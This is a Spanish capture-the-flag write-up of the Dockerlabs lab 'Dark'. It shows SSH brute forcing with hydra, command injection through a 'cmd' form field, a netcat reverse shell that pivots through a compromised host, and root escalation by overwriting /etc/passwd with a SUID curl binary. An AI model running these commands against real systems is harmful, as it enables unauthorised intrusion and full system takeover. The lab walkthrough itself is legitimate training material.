
# Writeup Template: Maquina `[ Dark ]`

- Tags: #Dark #Pivoting #BindShell
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Dark]()

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x dark.zip
sudo bash auto_deploy.sh dark1.tar dark2.tar
```

---
## Fase de Reconocimiento
El **pivoting** en hacking ético es una técnica utilizada durante pruebas de penetración o auditorías de seguridad para moverse lateralmente dentro de una red, aprovechando un sistema comprometido (como un punto de entrada) para acceder a otros dispositivos o subredes que no son directamente accesibles desde el exterior. Su objetivo es simular cómo un atacante podría escalar privilegios y expandir su alcance en un entorno restringido.
#### ¿Como funciona?
1. **Compromiso inicial**: Se explota una vulnerabilidad en un sistema (ej.: un servidor web) para ganar acceso.
2. **Reconocimiento interno**: Desde el sistema comprometido, se escanean redes internas para identificar nuevos objetivos (ej.: bases de datos, servidores críticos).
3. **Establecimiento de rutas**: Se utiliza el sistema comprometido como "puente" para redirigir el tráfico hacia sistemas internos, usando técnicas como:
   - **Túneles SSH/SSL**: Redirigir puertos o crear proxies.
   - **Herramientas de pivoting**: Meterpreter (Metasploit), Proxychains, o VPNs improvisadas.
   - **Port forwarding**: Exponer servicios internos a través del sistema comprometido.
### Direccion IP del Target `Dark 1`
```bash
10.10.10.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 10.10.10.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 10.10.10.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 10.10.10.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.10.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 10.10.10.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((DebianSid))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://10.10.10.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://10.10.10.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 10.10.10.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://10.10.10.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://10.10.10.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,txt,sh,html,js,java
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 318]
/info                 (Status: 200) [Size: 128]
/process.php          (Status: 500) [Size: 0]
```

Tenemos en la web principal donde nos pide que ingresenmos un **URL** por detras no sabemos si enplea un **ping** o una peticion con **curl**, **GET** o **POST** por lo que probaremos lo siguiente:
Nos ponemos en escucha en nuestra maquina de atacante por el puerto 80 con un servidor **python3**
```bash
python3 -m http.server 80
```

Ahora realizamos una peticion a nuestra maquina atacante desde la web para ver como responde:
```bash
http://172.17.0.1/pwned.js
```

En nuestro servidor tenemos una respuesta y es que esta intentando cargar el archivo: **pwned.js** que no existe pero intenta acceder a el
```bash
10.10.10.2 - - [16/Jun/2025 22:28:47] "GET /pwned.js HTTP/1.1" 404 -
```

Para robar una posible cookie de sesion necesitamos interaccion con un usuario del sistema para que funcione.
Revisando el otro archivo disponible en la ruta:
```bash
http://10.10.10.2/info
```

Tenemos la siguiente info:
```bash
Toni te recuerdo que he publicado las bases de datos de telefonica,la dgt y el banco santander en mi pagina ilegal (20.20.20.3)
```
### Credenciales Encontradas
Tenemos un potencial usuario para el servicio **ssh**
- Usuario: `[ toni ]`

Tambien tenemos una direccon **IP** a la cual no podemos acceder ya que no se encuntra en nuestro rango de red
```bash
20.20.20.3
```

No tenemos coneccion
```bash
ping -c 1 20.20.20.3
PING 20.20.20.3 (20.20.20.3) 56(84) bytes of data.

--- 20.20.20.3 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

Intentamos realizar una peticon desde la web en **Ingrese una URL**:
```bash
http://20.20.20.3
```

La web reacciona cambiando el valor: **Ingrese una URL** a **Busca un producto ilegal** lo que me hace pensar que tenemos una **subred** a la que podriamos acceder solo si ganamos acceso a el target **dark1**
Ya que ahora mirando el codigo fuente ahora refleja esa direccion **IP** a la que no podemos accder
```html
<h1>webilegal.com</h1>
    <form action="[http://20.20.20.3/process.php](view-source:http://20.20.20.3/process.php)" method="post">
        <label for="cmd">Busca un producto ilegal</label><br>
        <input type="text" id="cmd" name="cmd"><br>
    <input type="submit" value="Enviar">
</form>
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Realizaremos un ataque de fuerza bruta por **ssh** para el usuario **toni**
### Ejecucion del Ataque
```bash
# Comandos para explotación
hydra -l toni -P /usr/share/wordlists/rockyou.txt -f ssh://10.10.10.2
```

Tenemos las credenciales validad para este usuario **toni**
```bash
[22][ssh] host: 10.10.10.2   login: toni   password: banana
```
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 10.10.10.2 && ssh toni@10.10.10.2 # ( banana )
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
Listando los usuarios del sistema 
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
toni:x:1000:1000:,,,:/home/toni:/bin/bash
```

**Hallazgos Clave:**
- Binario con privilegios: `[Binario]`
- Credenciales de usuario: `[Usuario]:[Contraseña]`
### Explotacion de Privilegios

###### Usuario `[ toni ]`:
Usaremos la herramienta **pspy64** para enumerar el sistema y encontrar posibles fallas:
De esta url bajamos la version **pspy64**
```bash
https://github.com/DominicBreuker/pspy?tab=readme-ov-file
```

una ves descargado nos montamos un servidor con python para que pueda estar disponible la herramienta:
```bash
python3 -m http.server
```

Desde: **( /tmp )** con el comando **curl** realizaremos la peticon para que se transfiera **pspy64**
```bash
curl http://172.17.0.1/pspy64 -o pspy64
```

Ejecutamos la herramienta pero no obtenemos nada:
```bash
./pspy64
```

Sabiendo que no tenemos estos comandos disponibles:
```bash
toni@a011bfec493b:/tmp$ ping
-bash: ping: command not found
toni@a011bfec493b:/tmp$ ip a
-bash: ip: command not found
toni@a011bfec493b:/tmp$ ifconfig
-bash: ifconfig: command not found
```

## Pivoting `dark2`
El unico que podemos usuar es el comando **curl** por lo que intentamos realizar una peticion a esta direccion **IP** 
```bash
20.20.20.2
```

Al realizar la peticion obtenemos el codigo **HTML**:
```bash
curl http://20.20.20.3
```

```html
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <h1>webilegal.com</h1>
    <form action="http://20.20.20.3/process.php" method="post">
        <label for="cmd">Busca un producto ilegal</label><br>
        <input type="text" id="cmd" name="cmd"><br>
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
```

Tenemos un formulario y parece que tiene un parametro **cmd**, Revisando nuestra interfaz vemos lo siguiente:
```bash
hostname -I

10.10.10.2 20.20.20.2 
```

Eso indica que teenmos conectividad con la interfaz de red por lo que podemos intentar pivotear en la red:
```bash
20.20.20.2
```

Asi que intentaremos ejecutar un comando con **curl** de la siguiente manera apuntando a su pararmetro **cmd**
```bash
curl -s -X POST -d "cmd=id" http://20.20.20.3/process.php
```

Tenemos Ejecucion de comandos:**RCE** desde nuestra maquina victima **dark1** en la maquina objetivo **dark2**
**Objetivo** es usar como puente a **dark1** para que sea el intermediario entre **dark2** que es la que nos enviar la **bindShell** a nuestra maquina de atacante:

Sabiendo que tenemos ejecucion remota de comandos en la maquina **dark2**, Ahora tendremos que abrir una nueva sesion por **ssh** con el usuario **toni**
```bash
# Sesion numero 2 toni
nc -nlvp 443
```

Ahora desde la sesion 1 de **toni** ejecutamos el comando que nos enviara una **bindShell** a nuestra maquina atacante:
```bash
curl -s -X POST -d "cmd=nc -e /bin/bash 20.20.20.2 443" http://20.20.20.3/process.php
```

Logrando ganar acceso a **dark2** usando como puente a **dark1**
```bash
toni@a011bfec493b:~$ nc -nlvp 443
listening on [any] 443 ...

connect to [20.20.20.2] from (UNKNOWN) [20.20.20.3] 47564
whoami
www-data
```
###### Usuario `[ www-data ]`:
Buscando por privilegios **SUID** en **dark2** tenemos el comando **curl** del cual nos aprovecharemos para sobreescribir el archivo: **( /etc/passwd )**
Primero vemos el contenido del archivo: **( /etc/passwd )** con el comando **cat**
```bash
cat /etc/passwd
```

Ahora todo ese contenido lo copiamos, Pero antes de guardarno en un archivo bajo el mismo nombre: **( passwd )** le quitamos la: **( x )** al usuario **root** para que al sobreescribir el archivo, Nos permita conectanos como **root** sin proporcionar contrasena.
```bash
cat passwd # Archivo malicioso

root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

Ahora nos aprovechamos del binario de **curl** para sobreescribir el **passwd** original.
```bash
/usr/bin/curl file:///tmp/passwd -o /etc/passwd
```

Si ahora miramos el contenido del archivo lo hemos logrado sobreescribir:
```bash
cat /etc/passwd # Archivo malicioso

root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

Ahora podemos aprovecharnos para migrar a **root** sin proporcionar contrasena
```bash
# Comando para escalar al usuario: ( root )
su root
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@b491cd2003d7:~# whoami
root
```

---
## Lecciones Aprendidas
1. Aprendimos que es una **bindShell**
2. Aprendimos a realizar **pivoting** entre dos redes diferentes, usando como puente a una maquina victma para ganar acceso a la otra **subred**
3. Aprendimos a explotar el bianrio de **curl** para sobreescribir el archivo: **( /etc/passwd )** lo que nos permite ganar acceso como **root**